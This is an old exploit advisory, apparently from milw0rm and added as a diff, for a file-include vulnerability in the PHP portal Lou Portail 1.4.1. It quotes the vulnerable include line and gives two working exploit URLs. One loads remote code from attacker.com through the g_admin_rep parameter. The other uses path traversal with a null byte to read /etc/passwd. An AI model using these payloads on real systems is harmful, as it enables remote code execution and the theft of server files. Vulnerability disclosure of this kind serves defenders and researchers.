@@ -1,0 +1,29 @@
+## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ##
+#                                                               #
+#           [ Lou Portail 1.4.1 ]                               #
+#                                                                
+# Class:     Remote|Local File Include Vulnerability            #
+# Patch:     Unavailable                                        #
+# Published  2006/10/18                                         #
+# Remote:    Yes                                                
+# Local:     No                            			#
+# Type:      High                                               #
+# Site:      http://louportail.free.fr/                         #
+# Author:    MP
+# Contact:   mp01010@yahoo.com                    		#
+#                                				#
+#################################################################
+
+Vuln Code (admin/admin_module.php):
+
+<?...
+  include ("$g_admin_rep/admin_utils.$g_ext");
+...?>
+
+#Vuln 1.0 -> require register_globals = On
+http://louportail.com/admin/admin_module.php?g_admin_rep=http://attacker.com&g_ext=txt
+
+#Vuln 2.0 -> require magic_quotes_gpc = Off
+http://louportail.com/admin/admin_module.php?g_admin_rep=../../../../../../../../../../../../../../../../../../../../etc/passwd%00
+
+# milw0rm.com [2006-10-20]
